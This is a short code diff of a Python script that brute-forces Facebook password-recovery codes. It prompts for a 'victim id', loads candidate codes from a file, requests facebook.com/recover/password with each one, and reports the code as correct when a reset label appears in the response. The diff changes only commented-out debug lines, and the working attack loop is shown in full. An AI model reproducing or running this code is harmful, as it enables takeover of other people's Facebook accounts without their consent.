@@ -26,7 +26,7 @@ while True:
         try:
             f= open('codes.txt', 'r',encoding='utf-8')
             w=f.read()
-            #print(w)
+            
             
             print("Facebook code loaded \!/\n")
         except FileNotFoundError:
@@ -35,13 +35,13 @@ while True:
         target=input('victim id :')
         for l in lst:
         	print(l)
-        #	l = l.rstrip()
+        
         	try:
         		
         		rep= 'https://www.facebook.com/recover/password?u='+target+'&n='+str(l)+'&s=23&exp_locale=ar_AR&redirect_from=button'
         		gets= urlopen(rep).read()
         		search = re.search('account_recovery_password_reset_label', gets.decode('utf-8'))
-        	#	print(gets)
+        	
         		if search:
         			print ("The Code "+str(l)+" is Correct ^___^ ")
         			print(gets)
